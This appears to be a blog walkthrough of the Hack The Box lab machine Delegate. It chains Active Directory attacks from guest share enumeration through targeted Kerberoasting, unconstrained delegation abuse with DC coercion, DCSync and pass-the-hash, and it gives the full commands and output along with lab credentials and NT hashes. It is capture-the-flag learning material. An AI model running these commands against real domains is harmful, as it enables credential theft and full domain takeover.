---
title: "Delegate Walkthrough - HTB Medium | Unconstrained Delegation Abuse & DCSync"
description: "Complete walkthrough of Delegate from Hack The Box. A medium Windows Active Directory machine where a logon script left in the SYSVOL share leaks plaintext credentials for A.Briggs. BloodHound reveals a GenericWrite over N.Thompson, abused with a targeted Kerberoast to crack his password and gain a WinRM shell. N.Thompson holds SeEnableDelegationPrivilege, which is leveraged to create a computer account, flag it for unconstrained delegation, coerce the DC, and capture its TGT — leading to a DCSync and full domain compromise via Pass-the-Hash."
author: dua2z3rr
date: 2026-08-03 1:00:00
categories:
  - HackTheBox
  - Machines
tags: ["enterprise-network", "active-directory", "dns", "kerberos", "winrm", "kerberos-abuse", "unconstrained-delegation"]
image: /assets/img/delegate/delegate-resized.png
---

## Overview

Delegate is a medium-difficulty Windows machine that involves Active Directory attacks. The machine has the guest account enabled, allowing the attacker to read files that contain hard-coded credentials. The credentials allow us to WriteProperty of a user account that is allowed to have WinRM sessions on the Domain Controller. The compromised user has the `SeEnableDelegationPrivilege` privilege assigned, which allows us to modify the `TRUSTED_FOR_DELEGATION` flag for AD objects, enabling us to perform Unconstrained Delegation.

---

## External Enumeration

### Nmap

Let's start with the classic nmap scan:

```shell
ports=$(nmap -p- --min-rate=1000 -T4 delegate.htb 2>/dev/null | grep '^[0-9]' | cut -d '/' -f1 | paste -sd ',' -); nmap -vv -p"$ports" -sC -sV delegate.htb -oX delegate.xml

<SNIP>

PORT      STATE SERVICE       REASON          VERSION  
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus  
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-03 09:29:10Z)  
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn  
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds? syn-ack ttl 127  
464/tcp   open  kpasswd5?     syn-ack ttl 127  
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped    syn-ack ttl 127  
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped    syn-ack ttl 127  
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services  
| ssl-cert: Subject: commonName=DC1.delegate.vl  
| Issuer: commonName=DC1.delegate.vl  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2026-08-02T09:25:47  
| Not valid after:  2027-02-01T09:25:47  
| MD5:   03e13a4e8482baf684a65d05f7a7b122  
| SHA-1: 63fe87234c08d77215fcaa87a287bc96d034f012  
| -----BEGIN CERTIFICATE-----  
<SNIP>
|_-----END CERTIFICATE-----  
|_ssl-date: 2026-08-03T09:30:46+00:00; 0s from scanner time.  
| rdp-ntlm-info:    
|   Target_Name: DELEGATE  
|   NetBIOS_Domain_Name: DELEGATE  
|   NetBIOS_Computer_Name: DC1  
|   DNS_Domain_Name: delegate.vl  
|   DNS_Computer_Name: DC1.delegate.vl  
|   DNS_Tree_Name: delegate.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-08-03T09:30:07+00:00  
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing  
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
<SNIP>
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

**Key findings:**
- Domain: **delegate.vl**, Domain Controller: **DC1** (DC1.delegate.vl)
- Classic AD service set: **DNS** (53), **Kerberos** (88), **LDAP** (389/636/3268/3269), **SMB** (445), **RDP** (3389), **WinRM** (5985), **ADWS** (9389)

### SMB Share Enumeration

Using the guest account, we can quickly enumerate the readable SMB shares with the nxc module.

```shell
nxc smb DC1.delegate.vl -u 'guest' -p '' --shares -M spider_plus  
/root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesnt match a supported version!  
 warnings.warn(  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest:    
SPIDER_PLUS 10.129.234.69   445    DC1              [*] Started module spidering_plus with the following options:  
SPIDER_PLUS 10.129.234.69   445    DC1              [*]  DOWNLOAD_FLAG: False  
SPIDER_PLUS 10.129.234.69   445    DC1              [*]     STATS_FLAG: True  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] EXCLUDE_FILTER: ['print$', 'ipc$']  
SPIDER_PLUS 10.129.234.69   445    DC1              [*]   EXCLUDE_EXTS: ['ico', 'lnk']  
SPIDER_PLUS 10.129.234.69   445    DC1              [*]  MAX_FILE_SIZE: 50 KB  
SPIDER_PLUS 10.129.234.69   445    DC1              [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus  
SMB         10.129.234.69   445    DC1              [*] Enumerated shares  
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark  
SMB         10.129.234.69   445    DC1              -----           -----------     ------  
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin  
SMB         10.129.234.69   445    DC1              C$                              Default share  
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC  
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share    
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share    
SPIDER_PLUS 10.129.234.69   445    DC1              [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.234.69.json".  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] SMB Filtered Shares:  1  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] Total folders found:  19  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] Total files found:    7  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] File size average:    1.15 KB  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] File size min:        22 B  
SPIDER_PLUS 10.129.234.69   445    DC1              [*] File size max:        3.86 KB
```

Let's read the output file:

```json
{  
   "NETLOGON": {  
       "users.bat": {  
           "atime_epoch": "2023-08-26 14:54:29",  
           "ctime_epoch": "2023-08-26 14:45:24",  
           "mtime_epoch": "2023-10-01 11:08:32",  
           "size": "159 B"  
       }  
   },  
   "SYSVOL": {  
       "delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {  
           "atime_epoch": "2023-09-09 16:10:32",  
           "ctime_epoch": "2023-08-26 11:39:30",  
           "mtime_epoch": "2023-10-01 11:08:32",  
           "size": "22 B"  
       },  
       "delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {  
           "atime_epoch": "2023-08-26 13:24:26",  
           "ctime_epoch": "2023-08-26 11:39:30",  
           "mtime_epoch": "2023-10-01 11:08:32",  
           "size": "1.07 KB"  
       },  
       "delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {  
           "atime_epoch": "2023-08-26 12:01:56",  
           "ctime_epoch": "2023-08-26 12:01:56",  
           "mtime_epoch": "2023-10-01 11:08:32",  
           "size": "2.73 KB"  
       },  
       "delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {  
           "atime_epoch": "2023-09-09 16:10:32",  
           "ctime_epoch": "2023-08-26 11:39:30",  
           "mtime_epoch": "2023-10-01 11:08:32",  
           "size": "22 B"  
       },  
       "delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {  
           "atime_epoch": "2023-09-09 13:17:20",  
           "ctime_epoch": "2023-08-26 11:39:30",  
           "mtime_epoch": "2023-10-01 11:08:32",  
           "size": "3.86 KB"  
       },  
       "delegate.vl/scripts/users.bat": {  
           "atime_epoch": "2023-08-26 14:54:29",  
           "ctime_epoch": "2023-08-26 14:45:24",  
           "mtime_epoch": "2023-10-01 11:08:32",  
           "size": "159 B"  
       }  
   }  
}
```

There's a non-standard file inside SYSVOL called **users.bat**. Let's use smbclient-ng to download it locally.

```shell
smbclientng -d "DELEGATE" -u "guest" -p "" --host "DC1.delegate.vl"            
              _          _ _            _  
___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _  
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |  
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |  
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |  
   by @podalirius_                             v3.0.0  |___/  
      
 | Provide a password for 'DELEGATE\guest':    
[+] Successfully authenticated to 'DC1.delegate.vl' as 'DELEGATE\guest'!  
■[\\DC1.delegate.vl\]> use sysvol  
■[\\DC1.delegate.vl\SYSVOL\]> ls  
d-------     0.00 B  2025-09-05 08:22  .\  
d-------     0.00 B  2025-09-05 08:22  ..\  
d-------     0.00 B  2023-08-26 11:39  delegate.vl\  
■[\\DC1.delegate.vl\SYSVOL\]> cd delegate.vl/    
■[\\DC1.delegate.vl\SYSVOL\delegate.vl\]> ls  
d-------     0.00 B  2025-09-05 08:22  .\  
d-------     0.00 B  2025-09-05 08:22  ..\  
d--h--s-     0.00 B  2023-08-26 11:45  DfsrPrivate\  
d-------     0.00 B  2025-09-05 08:22  Policies\  
d-------     0.00 B  2025-09-05 08:22  scripts\  
■[\\DC1.delegate.vl\SYSVOL\delegate.vl\]> cd scripts  
■[\\DC1.delegate.vl\SYSVOL\delegate.vl\scripts\]> ls  
d-------     0.00 B  2025-09-05 08:22  .\  
d-------     0.00 B  2025-09-05 08:22  ..\  
-a------   159.00 B  2023-08-26 14:54  users.bat  
■[\\DC1.delegate.vl\SYSVOL\delegate.vl\scripts\]> get users.bat    
'users.bat' ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 159/159 bytes • ? • 0:00:00  
■[\\DC1.delegate.vl\SYSVOL\delegate.vl\scripts\]> exit
```

Now let's read the batch file:

```bat
rem @echo off  
net use * /delete /y  
net use v: \\dc1\development    
  
if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

The credentials `Administrator:P4ssw0rd1#123` obviously don't work, but `A.Briggs:P4ssw0rd1#123` do, and we can confirm it with nxc:

```shell
nxc smb DC1.delegate.vl -u 'Administrator' -p 'P4ssw0rd1#123' --shares    
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [-] delegate.vl\Administrator:P4ssw0rd1#123 STATUS_LOGON_FAILURE

nxc smb DC1.delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123' --shares  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123    
SMB         10.129.234.69   445    DC1              [*] Enumerated shares  
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark  
SMB         10.129.234.69   445    DC1              -----           -----------     ------  
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin  
SMB         10.129.234.69   445    DC1              C$                              Default share  
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC  
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share    
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
```

**Credentials:** `A.Briggs:P4ssw0rd1#123`

---

## Domain Enumeration

### BloodHound

Now that we have credentials, let's use BloodHound to see how the domain is structured.

Let's start neo4j right away since it takes a while to become fully operational:

```shell
neo4j start                                                                                                                          
Directories in use:  
home:         /var/lib/neo4j  
config:       /etc/neo4j  
logs:         /var/log/neo4j  
plugins:      /var/lib/neo4j/plugins  
import:       /var/lib/neo4j/import  
data:         /var/lib/neo4j/data  
certificates: /var/lib/neo4j/certificates  
licenses:     /var/lib/neo4j/licenses  
run:          /var/lib/neo4j/run  
Starting Neo4j.  
Started neo4j (pid:4429). It is available at http://localhost:7474
```

Let's enumerate the domain with bloodhound.py:

```shell
bloodhound.py --zip -c All -ns '10.129.234.69' -u 'A.Briggs' -p 'P4ssw0rd1#123' -dc "DC1.delegate.vl" -d "delegate.vl"  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: delegate.vl  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: DC1.delegate.vl  
INFO: Testing resolved hostname connectivity dead:beef::1fc5:c4a0:4834:1af9  
INFO: Trying LDAP connection to dead:beef::1fc5:c4a0:4834:1af9  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: DC1.delegate.vl  
INFO: Testing resolved hostname connectivity dead:beef::1fc5:c4a0:4834:1af9  
INFO: Trying LDAP connection to dead:beef::1fc5:c4a0:4834:1af9  
INFO: Found 9 users  
INFO: Found 53 groups  
INFO: Found 2 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: DC1.delegate.vl  
INFO: Done in 00M 16S  
INFO: Compressing output into 20260803120205_bloodhound.zip
```

And finally we open the GUI and load the zip into it:

```shell
bloodhound &> /dev/null &                                                                                                
[1] 6267
```

### GenericWrite over N.Thompson

From the BloodHound GUI we can see that our user has `GenericWrite` permissions over another user, and that user can obtain a shell via WinRM on the DC.

![bloodhound gui generic write](/assets/img/delegate/generic-write.png)

---

## Initial Access

### Targeted Kerberoasting

Since we have `GenericWrite` over N.Thompson, we can perform a targeted Kerberoast attack and crack it locally.

```shell
targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123' -f hashcat --request-user 'N.Thompson' -o hash  
[*] Starting kerberoast attacks  
[*] Attacking user (N.Thompson)  
[VERBOSE] SPN added successfully for (N.Thompson)  
[+] Writing hash to file for (N.Thompson)  
[VERBOSE] SPN removed successfully for (N.Thompson)
```

Now let's crack it with hashcat.

```shell
hashcat -m 13100 hash /opt/lists/rockyou.txt       
hashcat (v6.2.6) starting  
  
OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
==================================================================================================================================================  
* Device #1: pthread-haswell-AMD Ryzen 7 3700X 8-Core Processor, 14938/29941 MB (4096 MB allocatable), 16MCU  
  
<SNIP>
  
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$9bf165175ae70cd8593d34a34f7a9d1d$04869970f0016381caa182f7caedfae9<SNIP>b702e624e5401bd5fc2978a19:KALEB_2341  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Hash.Target......: $krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.T...978a19  
Time.Started.....: Mon Aug  3 12:40:28 2026 (2 secs)  
Time.Estimated...: Mon Aug  3 12:40:30 2026 (0 secs)  
<SNIP>
Started: Mon Aug  3 12:40:26 2026  
Stopped: Mon Aug  3 12:40:32 2026
```

The password for the user `N.Thompson` is `KALEB_2341`!

**Credentials:** `N.Thompson:KALEB_2341`

### WinRM Shell as N.Thompson

We can log into the DC with this new user and obtain the user flag.

```powershell
evil-winrm-py -u "N.Thompson" -p 'KALEB_2341' -i "DC1.delegate.vl"  
/root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!  
 warnings.warn(  
         _ _            _                                
 _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _    
/ -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |  
\___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |  
                                           |_|   |__/  v1.5.0  
  
[*] Connecting to 'DC1.delegate.vl:5985' as 'N.Thompson'  
evil-winrm-py PS C:\Users\N.Thompson\Documents> cd ../Desktop  
evil-winrm-py PS C:\Users\N.Thompson\Desktop> dir  
  
  
   Directory: C:\Users\N.Thompson\Desktop  
  
  
Mode                 LastWriteTime         Length Name                                                                     
----                 -------------         ------ ----                                                                     
-ar---          8/3/2026   2:26 AM             34 user.txt
```

**User flag obtained.**

---

## Privilege Escalation

### Enumerating Delegation Privileges

The box is called Delegate, and having already done the very similar box [Redelegate](https://dua2z3rr.github.io/posts/Redelegate-Walkthrough/), I know this is a delegation attack. However, as we said in the Redelegate box, there are 3 types of delegation, the 2 main ones being unconstrained and constrained. If we look at Thompson's privileges, we see that we have the `SeEnableDelegationPrivilege` privilege.

```powershell
evil-winrm-py PS C:\Users\N.Thompson\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                                                    State     
============================= ============================================================== =======  
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled  
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

### Unconstrained Delegation Abuse

Since we don't control an account that has the `TRUSTED_FOR_DELEGATION` flag, we can create a computer account and set the flag on it. We can use the tools `addcomputer.py` and `bloodyAD` for this.

```shell
addcomputer.py -computer-name 'faker' -computer-pass 'im-fake-got-it?!' -dc-ip '10.129.234.69' 'delegate.vl'/'N.Thompson':'KALEB_2341'  
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Successfully added machine account faker$ with password im-fake-got-it?!.
```

```shell
bloodyAD -d 'delegate.vl' -u 'N.Thompson' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'faker$' -f TRUSTED_FOR_DELEGATION  
[+] ['TRUSTED_FOR_DELEGATION'] property flags added to faker$'s userAccountControl
```

Now we need to add the DNS record to allow the delegation.

```shell
dnstool.py -u 'DELEGATE\faker$' -p 'im-fake-got-it?!' -r 'faker.delegate.vl' -a add -t A -d '10.10.17.30' -dns-ip '10.129.234.69' 'DC1.delegate.vl'  
[-] Connecting to host...  
[-] Binding to host  
[+] Bind OK  
[-] Adding new record  
[+] LDAP operation completed successfully
```

Perfect. Now we just need to start the listener and the coercion.

```shell
[Aug 03, 2026 - 23:55:05 (CEST)] exegol-main delegate # krbrelayx.py --krbpass 'im-fake-got-it?!' --krbsalt 'DELEGATE.VLhostfaker.delegate.vl' -dc-ip 10.129.234.69 --interface-ip 10.10.17.30  
[*] Protocol Client HTTP loaded..  
[*] Protocol Client HTTPS loaded..  
[*] Protocol Client LDAP loaded..  
[*] Protocol Client LDAPS loaded..  
[*] Protocol Client SMB loaded..  
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.  
[*] Running in unconstrained delegation abuse mode using the specified credentials.  
[*] Setting up SMB Server  
[*] Setting up HTTP Server on port 80  
[*] Setting up DNS Server  
  
[*] Servers started, waiting for connections  
[*] SMBD: Received connection from 10.129.234.69  
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]  
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

```shell
[Aug 03, 2026 - 23:55:56 (CEST)] exegol-main delegate # nxc smb DC1.delegate.vl -u 'faker$' -p 'im-fake-got-it?!' -M coerce_plus -o LISTENER='faker' ALWAYS=true    
/root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesnt match a supported version!  
 warnings.warn(  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\faker$:im-fake-got-it?!    
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, DFSCoerce  
COERCE_PLUS 10.129.234.69   445    DC1              Exploit Success, netdfs\NetrDfsRemoveRootTarget
```

### DCSync

Now that we have the ticket, we can impersonate the DC and perform a DCSync.

```shell
[Aug 03, 2026 - 23:57:42 (CEST)] exegol-main delegate # export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'                                             
[Aug 03, 2026 - 23:59:26 (CEST)] exegol-main delegate # secretsdump.py DC1.delegate.vl -k                                
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies    
  
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::  
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::  
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::  
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::  
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::  
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::  
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::  
faker$:4601:aad3b435b51404eeaad3b435b51404ee:a592dc51900c6f9fd9ea063a2ee2eff7:::  
[*] Kerberos keys grabbed  
<SNIP>
[*] Cleaning up...
```

**Hash found:** `Administrator: c32198ceab4cc695e65045562aa3ee93`

For the root flag we perform Pass-the-Hash.

```powershell
evil-winrm-py -u "Administrator" -H 'c32198ceab4cc695e65045562aa3ee93' -i "DC1.delegate.vl"  
/root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!  
 warnings.warn(  
         _ _            _                                
 _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _    
/ -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |  
\___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |  
                                           |_|   |__/  v1.5.0  
  
[*] Connecting to 'DC1.delegate.vl:5985' as 'Administrator'  
evil-winrm-py PS C:\Users\Administrator\Documents> cd ../Desktop  
evil-winrm-py PS C:\Users\Administrator\Desktop> ls  
  
  
   Directory: C:\Users\Administrator\Desktop  
  
  
Mode                 LastWriteTime         Length Name                                                                     
----                 -------------         ------ ----                                                                     
-ar---          8/3/2026   2:44 PM             34 root.txt
```

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

The attack is very easy; however, there are many variants depending on what we control and on which type of account holds `TRUSTED_FOR_DELEGATION`.

### Main Mistake

For 3 hours I tried to get the unconstrained delegation to work without success, because of my host's main firewall blocking inbound connections.

### Open Question

On this box we performed unconstrained delegation, whereas on the [Redelegate](https://dua2z3rr.github.io/posts/Redelegate-Walkthrough/) box we did constrained delegation. Is there a box for the third type of Kerberos delegation, resource-based constrained delegation?

---

**Completed this box? Did you take the unconstrained delegation path, or did you find another way to abuse N.Thompson's privileges?** Leave a comment down below!
